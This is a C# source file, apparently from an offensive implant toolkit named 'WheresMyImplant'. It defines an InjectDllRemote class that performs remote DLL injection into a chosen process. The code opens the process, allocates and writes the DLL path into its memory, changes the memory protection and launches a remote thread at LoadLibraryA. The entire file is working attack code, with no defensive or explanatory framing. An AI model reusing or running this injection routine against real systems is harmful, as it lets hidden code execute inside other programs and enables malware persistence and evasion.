using System;
using System.Runtime.InteropServices;

using Unmanaged;

namespace WheresMyImplant
{
    internal class InjectDllRemote : Base
    {
        internal InjectDllRemote(string library, UInt32 processId)
        {
            ////////////////////////////////////////////////////////////////////////////////
            WriteOutput("Attempting to get handle on " + processId);
            IntPtr hProcess = kernel32.OpenProcess(kernel32.PROCESS_CREATE_THREAD | kernel32.PROCESS_QUERY_INFORMATION | kernel32.PROCESS_VM_OPERATION | kernel32.PROCESS_VM_WRITE | kernel32.PROCESS_VM_READ, false, processId);
            WriteOutput("Handle: " + hProcess);
            IntPtr hmodule = kernel32.GetModuleHandle("kernel32.dll");
            IntPtr loadLibraryAddr = kernel32.GetProcAddress(hmodule, "LoadLibraryA");

            ////////////////////////////////////////////////////////////////////////////////
            IntPtr lpAddress = IntPtr.Zero;
            UInt32 dwSize = (UInt32)((library.Length + 1) * Marshal.SizeOf(typeof(char)));
            WriteOutputNeutral("Attempting to allocate memory");
            IntPtr lpBaseAddress = kernel32.VirtualAllocEx(hProcess, lpAddress, dwSize, kernel32.MEM_COMMIT | kernel32.MEM_RESERVE, Winnt.PAGE_READWRITE);
            WriteOutputGood("Allocated " + dwSize + " bytes at " + lpBaseAddress.ToString("X4"));
            WriteOutputGood("Memory Protection Set to PAGE_READWRITE");

            ////////////////////////////////////////////////////////////////////////////////
            UInt32 lpNumberOfBytesWritten = 0;
            IntPtr libraryPtr = Marshal.StringToHGlobalAnsi(library);
            WriteOutputNeutral("Attempting to write process memory");
            Boolean writeProcessMemoryResult = kernel32.WriteProcessMemory(hProcess, lpBaseAddress, libraryPtr, dwSize, ref lpNumberOfBytesWritten);
            WriteOutputGood("Wrote " + dwSize + " bytes");

            ////////////////////////////////////////////////////////////////////////////////
            UInt32 lpflOldProtect = 0;
            WriteOutputNeutral("Attempting to Alter Memory Protections to PAGE_EXECUTE_READ");
            Boolean virtualProtectExResult = kernel32.VirtualProtectEx(hProcess, lpBaseAddress, dwSize, Winnt.PAGE_EXECUTE_READ, ref lpflOldProtect);
            WriteOutputGood("Set Memory Protection to PAGE_EXECUTE_READ");

            ////////////////////////////////////////////////////////////////////////////////
            IntPtr lpThreadAttributes = IntPtr.Zero;
            UInt32 dwStackSize = 0;
            IntPtr lpParameter = IntPtr.Zero;
            UInt32 dwCreationFlags = 0;
            UInt32 threadId = 0;
            WriteOutputNeutral("Attempting to start remote thread");
            IntPtr hThread = kernel32.CreateRemoteThread(hProcess, lpThreadAttributes, dwStackSize, loadLibraryAddr, lpBaseAddress, dwCreationFlags, ref threadId);
            WriteOutputGood("Started Thread: " + hThread);

            ///////////////////////////////////////////////////////////////////////////////
            kernel32.WaitForSingleObjectEx(hProcess, hThread, 0xFFFFFFFF);
        }
    }
}